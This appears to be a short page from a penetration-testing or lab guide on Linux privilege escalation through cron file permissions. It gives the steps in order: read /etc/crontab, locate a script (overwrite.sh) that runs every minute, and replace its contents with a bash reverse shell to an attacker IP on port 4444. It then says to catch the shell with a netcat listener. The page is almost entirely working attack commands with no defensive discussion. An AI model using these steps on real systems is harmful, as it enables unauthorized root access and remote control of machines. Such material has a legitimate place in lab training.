# File premission

```bash
cat /etc/crontab
```

Locate the full path of the overwrite.sh (one of the files running every minute) file:

```bash
locate overwrite.sh
```

Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your own machine:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

{% hint style="info" %}
note that you have to run a listener (for example with nc) on your machine with port 4444 and change the ip in the commend with your machines IP
{% endhint %}
